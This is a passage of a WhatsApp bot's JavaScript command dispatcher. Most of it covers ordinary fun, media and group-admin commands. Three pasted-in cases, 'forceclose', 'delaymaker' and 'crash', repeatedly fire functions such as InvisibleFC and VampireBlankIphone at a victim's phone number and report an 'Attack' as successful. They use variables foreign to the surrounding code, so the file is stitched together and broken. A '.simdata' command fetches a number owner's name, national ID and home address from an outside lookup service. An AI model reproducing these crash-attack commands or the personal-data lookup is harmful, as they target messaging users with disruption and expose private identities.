                    await sock.sendMessage(chatId, { text: `Bot is now in *${action}* mode`, ...channelInfo });
                } catch (error) {
                    console.error('Error updating access mode:', error);
                    await sock.sendMessage(chatId, { text: 'Failed to update bot access mode', ...channelInfo });
                }
                break;
            case userMessage.startsWith('.anticall'):
                if (!message.key.fromMe && !senderIsOwnerOrSudo) {
                    await sock.sendMessage(chatId, { text: 'Only owner/sudo can use anticall.' }, { quoted: message });
                    break;
                }
                {
                    const args = userMessage.split(' ').slice(1).join(' ');
                    await anticallCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.pmblocker'):
                {
                    const args = userMessage.split(' ').slice(1).join(' ');
                    await pmblockerCommand(sock, chatId, message, args);
                }
                commandExecuted = true;
                break;
            case userMessage === '.owner':
                await ownerCommand(sock, chatId);
                break;
            case userMessage === '.tagall':
                await tagAllCommand(sock, chatId, senderId, message);
                break;
            case userMessage === '.tagnotadmin':
                await tagNotAdminCommand(sock, chatId, senderId, message);
                break;
            case userMessage.startsWith('.hidetag'):
                {
                    const messageText = rawText.slice(8).trim();
                    const replyMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
                    await hideTagCommand(sock, chatId, senderId, messageText, replyMessage, message);
                }
                break;
            case userMessage.startsWith('.tag'):
                const messageText = rawText.slice(4).trim();  // use rawText here, not userMessage
                const replyMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
                await tagCommand(sock, chatId, senderId, messageText, replyMessage, message);
                break;
            case userMessage.startsWith('.antilink'):
                if (!isGroup) {
                    await sock.sendMessage(chatId, {
                        text: 'This command can only be used in groups.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
                if (!isBotAdmin) {
                    await sock.sendMessage(chatId, {
                        text: 'Please make the bot an admin first.',
                        ...channelInfo
                    }, { quoted: message });
                    return;
                }
                await handleAntilinkCommand(sock, chatId, userMessage, senderId, isSenderAdmin, message);
                break;

            case userMessage === '.meme':
                await memeCommand(sock, chatId, message);
                break;
            case userMessage === '.joke':
                await jokeCommand(sock, chatId, message);
                break;
            case userMessage === '.quote':
                await quoteCommand(sock, chatId, message);
                break;
            case userMessage === '.fact':
                await factCommand(sock, chatId, message, message);
                break;
            case userMessage.startsWith('.weather'):
                const city = userMessage.slice(9).trim();
                if (city) {
                    await weatherCommand(sock, chatId, message, city);
                } else {
                    await sock.sendMessage(chatId, { text: 'Please specify a city, e.g., .weather London', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage === '.news':
                await newsCommand(sock, chatId);
                break;
            case userMessage.startsWith('.ttt') || userMessage.startsWith('.tictactoe'):
                const tttText = userMessage.split(' ').slice(1).join(' ');
                await tictactoeCommand(sock, chatId, senderId, tttText);
                break;
            case userMessage.startsWith('.move'):
                const position = parseInt(userMessage.split(' ')[1]);
                if (isNaN(position)) {
                    await sock.sendMessage(chatId, { text: 'Please provide a valid position number for Tic-Tac-Toe move.', ...channelInfo }, { quoted: message });
                } else {
                    tictactoeMove(sock, chatId, senderId, position);
                }
                break;
            case userMessage === '.topmembers':
                topMembers(sock, chatId, isGroup);
                break;
            case userMessage.startsWith('.hangman'):
                startHangman(sock, chatId);
                break;
            case userMessage.startsWith('.guess'):
                const guessedLetter = userMessage.split(' ')[1];
                if (guessedLetter) {
                    guessLetter(sock, chatId, guessedLetter);
                } else {
                    sock.sendMessage(chatId, { text: 'Please guess a letter using .guess <letter>', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage.startsWith('.trivia'):
                startTrivia(sock, chatId);
                break;
            case userMessage.startsWith('.answer'):
                const answer = userMessage.split(' ').slice(1).join(' ');
                if (answer) {
                    answerTrivia(sock, chatId, answer);
                } else {
                    sock.sendMessage(chatId, { text: 'Please provide an answer using .answer <answer>', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage.startsWith('.compliment'):
                await complimentCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.insult'):
                await insultCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.8ball'):
                const question = userMessage.split(' ').slice(1).join(' ');
                await eightBallCommand(sock, chatId, question);
                break;
            case userMessage.startsWith('.lyrics'):
                const songTitle = userMessage.split(' ').slice(1).join(' ');
                await lyricsCommand(sock, chatId, songTitle, message);
                break;
            case userMessage.startsWith('.simp'):
                const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const mentionedJid = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await simpCommand(sock, chatId, quotedMsg, mentionedJid, senderId);
                break;
            case userMessage.startsWith('.stupid') || userMessage.startsWith('.itssostupid') || userMessage.startsWith('.iss'):
                const stupidQuotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const stupidMentionedJid = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const stupidArgs = userMessage.split(' ').slice(1);
                await stupidCommand(sock, chatId, stupidQuotedMsg, stupidMentionedJid, senderId, stupidArgs);
                break;
            case userMessage === '.dare':
                await dareCommand(sock, chatId, message);
                break;
            case userMessage === '.truth':
                await truthCommand(sock, chatId, message);
                break;
            case userMessage === '.clear':
                if (isGroup) await clearCommand(sock, chatId);
                break;
            case userMessage.startsWith('.promote'):
                const mentionedJidListPromote = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await promoteCommand(sock, chatId, mentionedJidListPromote, message);
                break;
            case userMessage.startsWith('.demote'):
                const mentionedJidListDemote = message.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                await demoteCommand(sock, chatId, mentionedJidListDemote, message);
                break;
            case userMessage === '.ping':
                await pingCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.tc ') || userMessage === '.tc':
            case userMessage.startsWith('.truecaller ') || userMessage === '.truecaller': {
                const tcArgs = userMessage.replace(/^\.(tc|truecaller)\s*/, '');
                await truecallerCommand(sock, chatId, message, tcArgs);
                break;
            }
            case userMessage === '.alive':
                await aliveCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.mention '):
                {
                    const args = userMessage.split(' ').slice(1).join(' ');
                    const isOwner = message.key.fromMe || senderIsSudo;
                    await mentionToggleCommand(sock, chatId, message, args, isOwner);
                }
                break;
            case userMessage === '.setmention':
                {
                    const isOwner = message.key.fromMe || senderIsSudo;
                    await setMentionCommand(sock, chatId, message, isOwner);
                }
                break;
                case "fc-invis":
case "fclose":
case "forceclose": {
if (!isOwner&&!isPremium) return reply(mess.prem)
if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = pelaku + "@s.whatsapp.net"
await Encore.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
for (let r = 0; r < 80; r++) {
await InvisibleFC(isTarget);
await InvisibleFC(isTarget, Ptcp = true)
await sleep(5000)
await InvisibleFC(isTarget);
await InvisibleFC(isTarget, Ptcp = true)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Encore.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
reply(put)
}

break
case "delayinvis":
case "delaymaker": {
if (!isOwner&&!isPremium) return reply(mess.prem)
if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = pelaku + "@s.whatsapp.net"
await Encore.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
for (let r = 0; r < 80; r++) {
await Blankhard(isTarget);
await Blankhard(isTarget, Ptcp = true)
await sleep(5000)
await Blankhard(isTarget);
await Blankhard(isTarget, Ptcp = true)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Encore.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
reply(put)
}

break
case "crash":
 case "delayip": {
if (!isOwner&&!isPremium) return reply(mess.prem)
if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`)
    
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = pelaku + "@s.whatsapp.net"
await Encore.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
for (let r = 0; r < 50; r++) {
await VampireBlankIphone(isTarget);
await sleep(5000)
await FChyUi(isTarget, Ptcp = true)
}
    
let put = `*Information Attack*
* Target : ${pelaku}
* Status : Success
`
await Encore.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
reply(put)
}

break
            case userMessage.startsWith('.blur'):
                const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                await blurCommand(sock, chatId, message, quotedMessage);
                break;
            case userMessage.startsWith('.welcome'):
                if (isGroup) {
                    // Check admin status if not already checked
                    if (!isSenderAdmin) {
                        const adminStatus = await isAdmin(sock, chatId, senderId);
                        isSenderAdmin = adminStatus.isSenderAdmin;
                    }

                    if (isSenderAdmin || message.key.fromMe) {
                        await welcomeCommand(sock, chatId, message);
                    } else {
                        await sock.sendMessage(chatId, { text: 'Sorry, only group admins can use this command.', ...channelInfo }, { quoted: message });
                    }
                } else {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage.startsWith('.goodbye'):
                if (isGroup) {
                    // Check admin status if not already checked
                    if (!isSenderAdmin) {
                        const adminStatus = await isAdmin(sock, chatId, senderId);
                        isSenderAdmin = adminStatus.isSenderAdmin;
                    }

                    if (isSenderAdmin || message.key.fromMe) {
                        await goodbyeCommand(sock, chatId, message);
                    } else {
                        await sock.sendMessage(chatId, { text: 'Sorry, only group admins can use this command.', ...channelInfo }, { quoted: message });
                    }
                } else {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                }
                break;
            case userMessage === '.git':
            case userMessage === '.github':
            case userMessage === '.sc':
            case userMessage === '.script':
            case userMessage === '.repo':
                await githubCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.antibadword'):
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                    return;
                }

                const adminStatus = await isAdmin(sock, chatId, senderId);
                isSenderAdmin = adminStatus.isSenderAdmin;
                isBotAdmin = adminStatus.isBotAdmin;

                if (!isBotAdmin) {
                    await sock.sendMessage(chatId, { text: '*Bot must be admin to use this feature*', ...channelInfo }, { quoted: message });
                    return;
                }

                await antibadwordCommand(sock, chatId, message, senderId, isSenderAdmin);
                break;
            case userMessage.startsWith('.chatbot'):
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups.', ...channelInfo }, { quoted: message });
                    return;
                }

                // Check if sender is admin or bot owner
                const chatbotAdminStatus = await isAdmin(sock, chatId, senderId);
                if (!chatbotAdminStatus.isSenderAdmin && !message.key.fromMe) {
                    await sock.sendMessage(chatId, { text: '*Only admins or bot owner can use this command*', ...channelInfo }, { quoted: message });
                    return;
                }

                const match = userMessage.slice(8).trim();
                await handleChatbotCommand(sock, chatId, message, match);
                break;
            case userMessage.startsWith('.take') || userMessage.startsWith('.steal'):
                {
                    const isSteal = userMessage.startsWith('.steal');
                    const sliceLen = isSteal ? 6 : 5; // '.steal' vs '.take'
                    const takeArgs = rawText.slice(sliceLen).trim().split(' ');
                    await takeCommand(sock, chatId, message, takeArgs);
                }
                break;
            case userMessage === '.flirt':
                await flirtCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.character'):
                await characterCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.waste'):
                await wastedCommand(sock, chatId, message);
                break;
            case userMessage === '.ship':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await shipCommand(sock, chatId, message);
                break;
            case userMessage === '.groupinfo' || userMessage === '.infogp' || userMessage === '.infogrupo':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await groupInfoCommand(sock, chatId, message);
                break;
            case userMessage === '.resetlink' || userMessage === '.revoke' || userMessage === '.anularlink':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await resetlinkCommand(sock, chatId, senderId);
                break;
            case userMessage === '.staff' || userMessage === '.admins' || userMessage === '.listadmin':
                if (!isGroup) {
                    await sock.sendMessage(chatId, { text: 'This command can only be used in groups!', ...channelInfo }, { quoted: message });
                    return;
                }
                await staffCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.tourl') || userMessage.startsWith('.url'):
                await urlCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.emojimix') || userMessage.startsWith('.emix'):
                await emojimixCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.tg') || userMessage.startsWith('.stickertelegram') || userMessage.startsWith('.tgsticker') || userMessage.startsWith('.telesticker'):
                await stickerTelegramCommand(sock, chatId, message);
                break;

            case userMessage === '.vv':
                await viewOnceCommand(sock, chatId, message);
                break;
            case userMessage === '.clearsession' || userMessage === '.clearsesi':
                await clearSessionCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.autostatus'):
                const autoStatusArgs = userMessage.split(' ').slice(1);
                await autoStatusCommand(sock, chatId, message, autoStatusArgs);
                break;
            case userMessage.startsWith('.simp'):
                await simpCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.metallic'):
                await textmakerCommand(sock, chatId, message, userMessage, 'metallic');
                break;
            case userMessage.startsWith('.ice'):
                await textmakerCommand(sock, chatId, message, userMessage, 'ice');
                break;
            case userMessage.startsWith('.snow'):
                await textmakerCommand(sock, chatId, message, userMessage, 'snow');
                break;
            case userMessage.startsWith('.impressive'):
                await textmakerCommand(sock, chatId, message, userMessage, 'impressive');
                break;
            case userMessage.startsWith('.matrix'):
                await textmakerCommand(sock, chatId, message, userMessage, 'matrix');
                break;
            case userMessage.startsWith('.light'):
                await textmakerCommand(sock, chatId, message, userMessage, 'light');
                break;
            case userMessage.startsWith('.neon'):
                await textmakerCommand(sock, chatId, message, userMessage, 'neon');
                break;
            case userMessage.startsWith('.devil'):
                await textmakerCommand(sock, chatId, message, userMessage, 'devil');
                break;
            case userMessage.startsWith('.purple'):
                await textmakerCommand(sock, chatId, message, userMessage, 'purple');
                break;
            case userMessage.startsWith('.thunder'):
                await textmakerCommand(sock, chatId, message, userMessage, 'thunder');
                break;
            case userMessage.startsWith('.leaves'):
                await textmakerCommand(sock, chatId, message, userMessage, 'leaves');
                break;
            case userMessage.startsWith('.1917'):
                await textmakerCommand(sock, chatId, message, userMessage, '1917');
                break;
            case userMessage.startsWith('.arena'):
                await textmakerCommand(sock, chatId, message, userMessage, 'arena');
                break;
            case userMessage.startsWith('.hacker'):
                await textmakerCommand(sock, chatId, message, userMessage, 'hacker');
                break;
            case userMessage.startsWith('.sand'):
                await textmakerCommand(sock, chatId, message, userMessage, 'sand');
                break;
            case userMessage.startsWith('.blackpink'):
                await textmakerCommand(sock, chatId, message, userMessage, 'blackpink');
                break;
            case userMessage.startsWith('.glitch'):
                await textmakerCommand(sock, chatId, message, userMessage, 'glitch');
                break;
            case userMessage.startsWith('.fire'):
                await textmakerCommand(sock, chatId, message, userMessage, 'fire');
                break;
            case userMessage === '.surrender':
                // Handle surrender command for tictactoe game
                await handleTicTacToeMove(sock, chatId, senderId, 'surrender');
                break;
            case userMessage.startsWith('.antidelete'):
                const antideleteMatch = userMessage.slice(11).trim();
                await handleAntideleteCommand(sock, chatId, message, antideleteMatch);
                break;
            case userMessage === '.cleartmp':
                await clearTmpCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.callprivacy'):
                {
                    const cpArgs = userMessage.split(' ').slice(1);
                    await callPrivacyCommand(sock, chatId, message, cpArgs);
                }
                break;
            case userMessage === '.setpp':
                await setProfilePicture(sock, chatId, message);
                break;
            case userMessage.startsWith('.setgdesc'):
                {
                    const text = rawText.slice(9).trim();
                    await setGroupDescription(sock, chatId, senderId, text, message);
                }
                break;
            case userMessage.startsWith('.setgname'):
                {
                    const text = rawText.slice(9).trim();
                    await setGroupName(sock, chatId, senderId, text, message);
                }
                break;
            case userMessage.startsWith('.setgpp'):
                await setGroupPhoto(sock, chatId, senderId, message);
                break;
            case userMessage.startsWith('.instagram') || userMessage.startsWith('.insta') || (userMessage === '.ig' || userMessage.startsWith('.ig ')):
                await instagramCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.igsc'):
                await igsCommand(sock, chatId, message, true);
                break;
            case userMessage.startsWith('.igs'):
                await igsCommand(sock, chatId, message, false);
                break;
            case userMessage.startsWith('.tiktok') || userMessage.startsWith('.tt'):
                await tiktokCommand(sock, chatId, message);
                break;
                            case userMessage.startsWith('.ytmp3') || userMessage.startsWith('.mp3') || userMessage.startsWith('.song') || userMessage.startsWith('.play') || userMessage.startsWith('.music'):
                await ytmp3Command(sock, chatId, message);
                break;
            case userMessage.startsWith('.ytmp4') || userMessage.startsWith('.video') || userMessage.startsWith('.yt'):
                await ytmp4Command(sock, chatId, message);
                break;
            case userMessage.startsWith('.gpt') || userMessage.startsWith('.gemini') || userMessage.startsWith('.claude') || userMessage.startsWith('.haiku') || userMessage.startsWith('.chiku'):
                await aiCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.translate') || userMessage.startsWith('.trt'):
                const commandLength = userMessage.startsWith('.translate') ? 10 : 4;
                await handleTranslateCommand(sock, chatId, message, userMessage.slice(commandLength));
                return;
            case userMessage.startsWith('.ss') || userMessage.startsWith('.ssweb') || userMessage.startsWith('.screenshot'):
                const ssCommandLength = userMessage.startsWith('.screenshot') ? 11 : (userMessage.startsWith('.ssweb') ? 6 : 3);
                await handleSsCommand(sock, chatId, message, userMessage.slice(ssCommandLength).trim());
                break;
            case userMessage.startsWith('.areact') || userMessage.startsWith('.autoreact') || userMessage.startsWith('.autoreaction'):
                await handleAreactCommand(sock, chatId, message, isOwnerOrSudoCheck);
                break;
            case userMessage.startsWith('.sudo'):
                await sudoCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.approve '):
                await approvePayment(sock, chatId, message, userMessage.slice(9).trim(), isOwnerOrSudoCheck);
                break;
            case userMessage.startsWith('.reject '):
                await rejectPayment(sock, chatId, message, userMessage.slice(8).trim(), isOwnerOrSudoCheck);
                break;
            case userMessage.startsWith('.checkpaid'):
                await checkPaid(sock, chatId, message, userMessage.slice(11).trim(), isOwnerOrSudoCheck);
                break;
            case userMessage === '.pendingpay':
                await pendingPayments(sock, chatId, message, isOwnerOrSudoCheck);
                break;
            case userMessage === '.shayari' || userMessage === '.shayri':
                await shayariCommand(sock, chatId, message);
                break;
            case userMessage === '.roseday':
                await rosedayCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.imagine') || userMessage.startsWith('.flux') || userMessage.startsWith('.dalle'): await imagineCommand(sock, chatId, message);
                break;
            case userMessage === '.jid': await groupJidCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.autotyping'):
                await autotypingCommand(sock, chatId, message);
                commandExecuted = true;
                break;
            case userMessage.startsWith('.autoread'):
                await autoreadCommand(sock, chatId, message);
                commandExecuted = true;
                break;
            case userMessage.startsWith('.heart'):
                await handleHeart(sock, chatId, message);
                break;
            case userMessage.startsWith('.horny'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['horny', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.circle'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['circle', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.lgbt'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['lgbt', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.lolice'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['lolice', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.simpcard'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['simpcard', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.tonikawa'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['tonikawa', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.its-so-stupid'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['its-so-stupid', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.namecard'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['namecard', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;

            case userMessage.startsWith('.oogway2'):
            case userMessage.startsWith('.oogway'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const sub = userMessage.startsWith('.oogway2') ? 'oogway2' : 'oogway';
                    const args = [sub, ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.tweet'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['tweet', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.ytcomment'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['youtube-comment', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.comrade'):
            case userMessage.startsWith('.gay'):
            case userMessage.startsWith('.glass'):
            case userMessage.startsWith('.jail'):
            case userMessage.startsWith('.passed'):
            case userMessage.startsWith('.triggered'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const sub = userMessage.slice(1).split(/\s+/)[0];
                    const args = [sub, ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.animu'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = parts.slice(1);
                    await animeCommand(sock, chatId, message, args);
                }
                break;
            // animu aliases
            case userMessage.startsWith('.nom'):
            case userMessage.startsWith('.poke'):
            case userMessage.startsWith('.cry'):
            case userMessage.startsWith('.kiss'):
            case userMessage.startsWith('.pat'):
            case userMessage.startsWith('.hug'):
            case userMessage.startsWith('.wink'):
            case userMessage.startsWith('.facepalm'):
            case userMessage.startsWith('.face-palm'):
            case userMessage.startsWith('.animuquote'):
            case userMessage.startsWith('.quote'):
            case userMessage.startsWith('.loli'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    let sub = parts[0].slice(1);
                    if (sub === 'facepalm') sub = 'face-palm';
                    if (sub === 'quote' || sub === 'animuquote') sub = 'quote';
                    await animeCommand(sock, chatId, message, [sub]);
                }
                break;
            case userMessage === '.crop':
                await stickercropCommand(sock, chatId, message);
                commandExecuted = true;
                break;
            case userMessage.startsWith('.pies'):
                {
                    const parts = rawText.trim().split(/\s+/);
                    const args = parts.slice(1);
                    await piesCommand(sock, chatId, message, args);
                    commandExecuted = true;
                }
                break;
            case userMessage === '.china':
                await piesAlias(sock, chatId, message, 'china');
                commandExecuted = true;
                break;
            case userMessage === '.indonesia':
                await piesAlias(sock, chatId, message, 'indonesia');
                commandExecuted = true;
                break;
            case userMessage === '.japan':
                await piesAlias(sock, chatId, message, 'japan');
                commandExecuted = true;
                break;
            case userMessage === '.korea':
                await piesAlias(sock, chatId, message, 'korea');
                commandExecuted = true;
                break;
            case userMessage === '.india':
                await piesAlias(sock, chatId, message, 'india');
                commandExecuted = true;
                break;
            case userMessage === '.malaysia':
                await piesAlias(sock, chatId, message, 'malaysia');
                commandExecuted = true;
                break;
            case userMessage === '.thailand':
                await piesAlias(sock, chatId, message, 'thailand');
                commandExecuted = true;
                break;
            case userMessage.startsWith('.update'):
                {
                    const parts = rawText.trim().split(/\s+/);
                    const zipArg = parts[1] && parts[1].startsWith('http') ? parts[1] : '';
                    await updateCommand(sock, chatId, message, zipArg);
                }
                commandExecuted = true;
                break;
            case userMessage.startsWith('.removebg') || userMessage.startsWith('.rmbg') || userMessage.startsWith('.nobg'):
                await removebgCommand.exec(sock, message, userMessage.split(' ').slice(1));
                break;
            case userMessage.startsWith('.remini') || userMessage.startsWith('.enhance') || userMessage.startsWith('.upscale'):
                await reminiCommand(sock, chatId, message, userMessage.split(' ').slice(1));
                break;
            case userMessage.startsWith('.sora'):
                await soraCommand(sock, chatId, message);
                break;

            // ─── SIM DATA COMMAND ───────────────────────────────────────────
            case userMessage.startsWith('.simdata'):
            case userMessage.startsWith('.sim'): {
                const parts = rawText.trim().split(/\s+/);
                const number = parts[1];

                if (!number) {
                    await sock.sendMessage(chatId, {
                        text: '❌ *SIM Data Check*\n\nPlease provide a phone number.\n\n📌 *Usage:* .simdata <number>\n📌 *Example:* .simdata 03001234567',
                        ...channelInfo
                    }, { quoted: message });
                    commandExecuted = true;
                    break;
                }

                try {
                    await sock.sendMessage(chatId, {
                        text: `🔍 Checking SIM data for *${number}*... Please wait.`,
                        ...channelInfo
                    }, { quoted: message });

                    const apiUrl = `https://sim-info-api.wasif-ali.workers.dev/?search=${encodeURIComponent(number)}`;

                    let result;
                    try {
                        const axiosResp = await axios.get(apiUrl, {
                            timeout: 15000,
                            headers: {
                                'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
                                'Accept': 'application/json'
                            }
                        });
                        result = axiosResp.data;
                    } catch (axErr) {
                        throw new Error('Network error: ' + axErr.message);
                    }

                    // API returns: { success, count, records: [{name, mobile, cnic, address, network}] }
                    let replyText = `📋 *SIM Data Result*\n`;
                    replyText += `━━━━━━━━━━━━━━━━━━\n`;
                    replyText += `📱 *Number:* ${number}\n`;

                    // Check success and records array
                    const records = result?.records;

                    if (result?.success && Array.isArray(records) && records.length > 0) {
                        records.forEach((rec, idx) => {
                            if (records.length > 1) replyText += `\n📌 *Record ${idx + 1}:*\n`;
                            if (rec.name)    replyText += `👤 *Name:* ${rec.name}\n`;
                            if (rec.mobile)  replyText += `📞 *Mobile:* ${rec.mobile}\n`;
                            if (rec.cnic)    replyText += `🪪 *CNIC:* ${rec.cnic}\n`;
                            if (rec.address) replyText += `🏠 *Address:* ${rec.address}\n`;
                            if (rec.network) replyText += `📶 *Network:* ${rec.network}\n`;
                        });
                    } else {
                        replyText += `⚠️ *No record found for this number.*\n`;
                    }

                    replyText += `━━━━━━━━━━━━━━━━━━\n`;
                    replyText += `_Powered by Usman Khan Chachar_`;

                    await sock.sendMessage(chatId, {
                        text: replyText,
                        ...channelInfo
                    }, { quoted: message });

                } catch (err) {
                    console.error('SimData error:', err.message);
                    await sock.sendMessage(chatId, {
                        text: `❌ *SIM Data Error*\n\n*Debug:* ${err.message}\n\nNumber: *${number}*`,
                        ...channelInfo
                    }, { quoted: message });
                }

                commandExecuted = true;
                break;
            }
            // ──────────────────────────────────────────
            
            
            
            //──────────────────────

            case userMessage === '.namaz' || userMessage === '.prayer' || userMessage === '.namazvaqt':
                await namazCommand(sock, chatId, message);
                commandExecuted = true;
                break;

            // ══════════════════════════════════════════
            // 📖 HADITH COMMANDS - 10 Authentic Books
            // ══════════════════════════════════════════

            // .hadithbooks / .hadithlist / .hbooks → show all books
            case userMessage === '.hadithbooks':
            case userMessage === '.hadithlist':
            case userMessage === '.hbooks':
                await sock.sendMessage(chatId, { text: getBooksListMessage() }, { quoted: message });
                commandExecuted = true;
                break;

            // .hadith [book] [number]
            case userMessage.startsWith('.hadith'): {
                const hadithArgs = rawText.slice('.hadith'.length).trim();
                await hadithCommand(sock, chatId, message, hadithArgs);
                commandExecuted = true;
                break;
            }

            // Short book commands: .bukhari, .muslim, .tirmizi etc.
            case userMessage.startsWith('.bukhari'):
            case userMessage.startsWith('.muslim'):
            case userMessage.startsWith('.tirmizi'):
            case userMessage.startsWith('.tirmidhi'):
            case userMessage.startsWith('.abudawud'):
            case userMessage.startsWith('.dawud'):
            case userMessage.startsWith('.nasai'):
            case userMessage.startsWith('.ibnmajah'):
            case userMessage.startsWith('.majah'):
            case userMessage.startsWith('.ahmad'):
            case userMessage.startsWith('.musnad'):
            case userMessage.startsWith('.muwatta'):
            case userMessage.startsWith('.darimi'):
            case userMessage.startsWith('.riyadh'): {
                // Extract command word (e.g. "bukhari") and args (e.g. "2812")
                const cmdWord = userMessage.slice(1).split(/\s+/)[0]; // remove dot, get first word
                const bKey = findBookKey(cmdWord);
                if (bKey) {
                    const bArgs = rawText.slice(cmdWord.length + 1).trim(); // +1 for dot
                    await bookCommand(sock, chatId, message, bKey, bArgs);
                    commandExecuted = true;
                }
                break;
            }

            case userMessage.startsWith('.pair'): {
                const q = rawText.slice('.pair'.length).trim();
                await pairCommand(sock, chatId, message, q);
                commandExecuted = true;
                break;
            }

            case userMessage.startsWith('.facebook') || userMessage.startsWith('.fbdl') || userMessage.startsWith('.fb'): {
                const cmdLen = userMessage.startsWith('.facebook') ? 9 : userMessage.startsWith('.fbdl') ? 5 : 3;
                const q = rawText.slice(cmdLen).trim();
                await facebookCommand(sock, chatId, message, q);
                commandExecuted = true;
                break;
            }

            default:
                // ── Unknown command handler ──
                if (userMessage.startsWith('.')) {
                    // It looks like a command but doesn't exist
                    const suggestions = getCommandSuggestions(userMessage);
                    let unknownMsg = `❌ *Command not found:* \`${userMessage.split(' ')[0]}\`

`;

                    if (suggestions.length > 0) {
                        unknownMsg += `💡 *Kya aap yeh kehna chahte the?*
`;
                        suggestions.forEach(s => {
                            unknownMsg += `  • \`${s}\`
